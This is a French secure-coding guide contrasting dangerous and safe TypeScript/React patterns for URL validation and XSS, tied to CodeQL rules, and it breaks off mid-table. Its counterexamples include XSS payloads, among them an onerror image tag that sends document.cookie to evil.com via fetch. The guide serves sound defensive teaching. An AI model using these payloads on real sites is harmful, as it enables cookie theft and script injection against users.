# Patterns Dangereux vs Sûrs - Guide Visuel\n\nComparaison côte à côte des patterns à éviter et des solutions correctes.\n\n---\n\n## 🔴 Validation d'URL\n\n### Pattern 1: `startsWith(\"https://\")`\n\n```typescript\n// ❌ DANGEREUX - CodeQL: js/incomplete-url-substring-sanitization\nif (url.startsWith(\"https://\")) {\n  // Utiliser l'URL\n}\n\n// Contre-exemples qui passent le test:\n// \"https://evil.com/https://legit.com\" ✗ Passe le test!\n// \"https://javascript:alert(1)\" ✗ Passe le test!\n```\n\n```typescript\n// ✅ CORRECT - CodeQL-safe\nfunction hasHttpsProtocol(url: string | undefined): boolean {\n  if (!url || typeof url !== \"string\") return false;\n  try {\n    const parsed = new URL(url);\n    return parsed.protocol === \"https:\";\n  } catch {\n    return false;\n  }\n}\n\nif (hasHttpsProtocol(url)) {\n  // Utiliser l'URL\n}\n\n// Contre-exemples qui échouent correctement:\n// \"https://evil.com/https://legit.com\" ✓ Échoue (URL invalide)\n// \"https://javascript:alert(1)\" ✓ Échoue (protocole invalide)\n```\n\n---\n\n### Pattern 2: `includes(\"http\")`\n\n```typescript\n// ❌ DANGEREUX - CodeQL: js/incomplete-url-substring-sanitization\nif (url.includes(\"http\")) {\n  // Utiliser l'URL\n}\n\n// Contre-exemples qui passent le test:\n// \"javascript://alert(1)//http\" ✗ Passe le test!\n// \"data:text/html,<script>alert(1)</script>\" ✗ Passe le test!\n```\n\n```typescript\n// ✅ CORRECT - CodeQL-safe\nfunction hasHttpsProtocol(url: string | undefined): boolean {\n  if (!url || typeof url !== \"string\") return false;\n  try {\n    const parsed = new URL(url);\n    return parsed.protocol === \"https:\";\n  } catch {\n    return false;\n  }\n}\n\nif (hasHttpsProtocol(url)) {\n  // Utiliser l'URL\n}\n```\n\n---\n\n### Pattern 3: Vérifier le hostname\n\n```typescript\n// ❌ DANGEREUX - Substring matching\nif (url.includes(\"www.academieduclimat.paris\")) {\n  // Utiliser l'URL\n}\n\n// Contre-exemples qui passent le test:\n// \"https://evil.com/www.academieduclimat.paris\" ✗ Passe le test!\n// \"https://www.academieduclimat.paris.evil.com\" ✗ Passe le test!\n```\n\n```typescript\n// ✅ CORRECT - Exact hostname matching\nfunction isAllowedDomain(url: string, allowedHostname: string): boolean {\n  try {\n    const parsed = new URL(url);\n    return parsed.hostname === allowedHostname;\n  } catch {\n    return false;\n  }\n}\n\nif (isAllowedDomain(url, \"www.academieduclimat.paris\")) {\n  // Utiliser l'URL\n}\n\n// Contre-exemples qui échouent correctement:\n// \"https://evil.com/www.academieduclimat.paris\" ✓ Échoue\n// \"https://www.academieduclimat.paris.evil.com\" ✓ Échoue\n```\n\n---\n\n## 🔴 Injection HTML / XSS\n\n### Pattern 1: `innerHTML` avec du texte\n\n```typescript\n// ❌ DANGEREUX - CodeQL: js/xss-through-dom\nconst button = document.querySelector(\"button\");\nbutton.innerHTML = \"↩\";\n\n// Pourquoi? CodeQL détecte même les constantes pour éviter les faux négatifs\n// Si le contenu devient dynamique plus tard, c'est une vulnérabilité\n```\n\n```typescript\n// ✅ CORRECT - Utiliser textContent\nconst button = document.querySelector(\"button\");\nbutton.textContent = \"↩\"; // Interprété comme du texte, pas du HTML\n\n// Avantages:\n// - Sûr même si le contenu devient dynamique\n// - Plus performant (pas de parsing HTML)\n// - Intention claire du code\n```\n\n---\n\n### Pattern 2: `dangerouslySetInnerHTML` avec traduction\n\n```typescript\n// ❌ DANGEREUX - CodeQL: js/xss-through-dom\n<div dangerouslySetInnerHTML={{ __html: t(\"footer.partner\") }} />\n\n// Pourquoi? Si la traduction contient du HTML non-sanitisé, c'est une XSS\n// Exemple: t(\"footer.partner\") = \"<img src=x onerror='alert(1)'>\" → XSS!\n```\n\n```typescript\n// ✅ CORRECT - Laisser React sanitiser\n<div>{t(\"footer.partner\")}</div>\n\n// Avantages:\n// - React sanitise automatiquement\n// - Pas de risque de XSS\n// - Code plus simple\n\n// Si HTML contrôlé est nécessaire:\nimport DOMPurify from \"dompurify\";\n\n<div \n  dangerouslySetInnerHTML={{ \n    __html: DOMPurify.sanitize(t(\"footer.partner\")) \n  }} \n/>\n```\n\n---\n\n### Pattern 3: `dangerouslySetInnerHTML` pour les styles CSS\n\n```typescript\n// ❌ DANGEREUX - CodeQL: js/xss-through-dom\n<style dangerouslySetInnerHTML={{ __html: `\n  @media print {\n    body { color: red; }\n  }\n`}} />\n\n// Pourquoi? CodeQL détecte dangerouslySetInnerHTML même pour les styles\n```\n\n```typescript\n// ✅ CORRECT - Utiliser style JSX\n<style jsx>{`\n  @media print {\n    body { color: red; }\n  }\n`}</style>\n\n// Avantages:\n// - Sûr et idiomatique\n// - Scoped au composant\n// - Pas de risque de XSS\n\n// Alternative avec styled-components:\nimport styled from \"styled-components\";\n\nconst PrintStyles = styled.div`\n  @media print {\n    body { color: red; }\n  }\n`;\n```\n\n---\n\n### Pattern 4: `innerHTML` avec contenu utilisateur\n\n```typescript\n// ❌ DANGEREUX - CodeQL: js/xss-through-dom\nconst userComment = getUserComment(); // Contenu utilisateur\nelement.innerHTML = userComment;\n\n// Exemple d'attaque:\n// userComment = \"<img src=x onerror='fetch(\\\"https://evil.com?cookie=\\\" + document.cookie)'>\" \n// → Vol de cookies!\n```\n\n```typescript\n// ✅ CORRECT - Utiliser textContent\nconst userComment = getUserComment();\nelement.textContent = userComment; // Interprété comme du texte\n\n// Avantages:\n// - Sûr contre les attaques XSS\n// - Affiche le contenu tel quel\n// - Intention claire\n\n// Si HTML est nécessaire, sanitiser:\nimport DOMPurify from \"dompurify\";\n\nelement.innerHTML = DOMPurify.sanitize(userComment);\n```\n\n---\n\n## 📊 Tableau de synthèse\n\n| Pattern | Danger | Solution | Cas d'usage
